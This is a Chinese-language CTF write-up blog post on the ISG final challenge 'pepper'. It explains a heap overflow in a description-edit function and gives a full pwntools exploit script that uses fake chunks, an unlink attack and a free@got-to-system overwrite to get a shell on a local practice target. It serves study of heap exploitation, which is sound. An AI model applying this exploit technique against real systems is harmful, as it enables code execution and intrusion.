---
title: ISG决赛pepper
author: rk700
layout: post
categories:
  - writeup
tags:
  - exploit
---

这道题目是去年参加ISG决赛时遇到的。二进制文件是有多个漏洞，我们当时是做的栈溢出，而堆溢出一直没有研究过。正好这两天在学习堆溢出，发现这道题和0CTF的freenote十分相似，不愧是同一批人出的题目。所以，在这里简要记录下，因为思路是完全一样的

具体地，通过修改restaurant的功能，我们可以重新编辑restaurant的description。description是保存在堆上的，但在修改时，完全没有考虑新的内容会超过之前分配的大小，于是堆溢出了。与freenote一样，我们写大量的内容到堆上，来构造一系列伪chunks，再通过`free`时的`unlink`，来修改某个值。

在`unlink`检查时，也用的是和freenote一样的方法，即找到某个存有我们伪chunk地址的地方，从那里往前3个指针作为`fd`，往前2个指针作为`bk`。freenote里，保存`malloc`地址的结构数组是存在堆上的，所以那道题我们需要首先得到heap的地址。而pepper这道题，保存所有restaurant结构的数组是在全局变量，已经是固定位置，所以省下了这一环节。

后面的思路就完全一样了。再次修改，使得description指向`free@got`，并通过读写，将`system`的地址写到`free@got`，最后删除时就会调用`system`了。

下面是具体代码：

{% highlight python %}
#!/usr/bin/env python2

from pwn import *

r = remote('127.0.0.1', 55555)

f = open("payload", "wb")

def send(x):
    r.send(x)
    f.write(x)

def newItem(length, desc, name="restaurant", address="road", no="1", score=100):
    r.recvuntil('Your choice: ')
    send('4\n')
    r.recvuntil('Input Rest. name(no more than 32 characters): ')
    send(name+'\n')
    r.recvuntil('On which road(no more than 128 characters)? ')
    send(address+'\n')
    r.recvuntil('Street No? ')
    send(no+'\n')
    r.recvuntil('Length of the description of your favourite dish: ')
    send(str(length)+'\n')
    r.recvuntil('Input your description:')
    send(desc+'\n')
    r.recvuntil('Finally, give a score ;-)')
    send(str(score)+'\n')

def delItem(i):
    r.recvuntil('Your choice: ')
    send('3\n')
    r.recvuntil('Input the index of Rest. you want to delete: ')
    send(str(i) + '\n')

def showItem(i):
    r.recvuntil('Your choice: ')
    send('2\n')
    r.recvuntil('Please input the index of the restaurant: ')
    send(str(i)+'\n')
    r.recvuntil('Recommended Dish: ')
    return r.recvline(keepends=False)

def editItem(i, length, desc, score=100):
    r.recvuntil('Your choice: ')
    send('5\n')
    r.recvuntil('Input the index of Rest. you want to edit: ')
    send(str(i) + '\n')
    r.recvuntil('New score XD: ')
    send(str(score) + '\n')
    r.recvuntil('Do you want to change the description of the recommended dish(y/n)? ')
    send("y\n")
    r.recvuntil('New len: ')
    send(str(length)+'\n')
    r.recvuntil('New description: ')
    send(desc+'\n')

def quit():
    r.recvuntil('Your choice: ')
    send('6\n')

newItem(127, "aaaa")
newItem(127, "bbbb")

#fd->bk = bk->fd = &ptr
ptr = 0x0804b0a0 + 4*2
fd = ptr - 4*3
bk = ptr - 4*2

# crafted chunks
# chunk0' starts from &ptr
# chunk0 is free
chunk0 = p32(0) + p32(0x81) + p32(fd) + p32(bk) + "A"*(0x80-4*4)
chunk1 = p32(0x80) + p32(0x90) + "B"*(0x90-4*2)
chunk2 = p32(0) + p32(0x91) + "C"*(0x90-4*2)
chunk3 = p32(0) + p32(0x91) + "D"*(0x90-4*2)
chunk = chunk0 + chunk1 + chunk2 + chunk3
editItem(0, 1000, chunk)

# free chunk1, and will result in unlink of chunk0
delItem(1)
# now restaurant0's description points to 0x0804b09c

freeGot = 0x0804b014
free2system = -0x38520

# will overwrite first 12 bytes of restaurant0 and set its description pointing to free@got
editItem(0, 20, p32(0)+p32(100)+p32(20)+p32(freeGot))

s = showItem(0)
freeAddr = u32((s[:4].ljust(4, '\x00'))[:4])
systemAddr = freeAddr + free2system
print "system is at %s" % hex(systemAddr)

# write system to free@got
editItem(0, 4, p32(systemAddr))

# invoke system("/bin/sh")
newItem(20, "/bin/sh")
delItem(1)

r.interactive()
exit(0)
{% endhighlight %}

所以这道题用的还是`unlink`。而我看[217的writeup](http://217.logdown.com/posts/241446-isg-2014-pepper)里，似乎是通过fastbin来做的，有空再研究下fastbin这种方法。
